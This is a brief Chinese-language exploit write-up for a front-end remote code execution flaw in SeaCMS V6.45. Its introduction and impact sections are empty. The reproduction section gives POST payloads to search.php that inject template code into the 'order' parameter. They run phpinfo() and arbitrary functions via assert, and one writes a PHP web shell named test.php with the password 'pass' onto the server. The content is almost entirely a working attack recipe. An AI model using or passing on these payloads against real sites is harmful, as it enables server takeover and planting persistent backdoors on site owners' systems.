海洋CMS V6.45 前台getshell
==========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

<http://0-sec.org/search.php?searchtype=5>

POST

    searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
    searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo();

一句话payload，文件test.php 密码pass:

path:

    http://0-sec.org/search.php
    }{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("test.php","w"),'<?php eval($_POST["pass"]);?>'
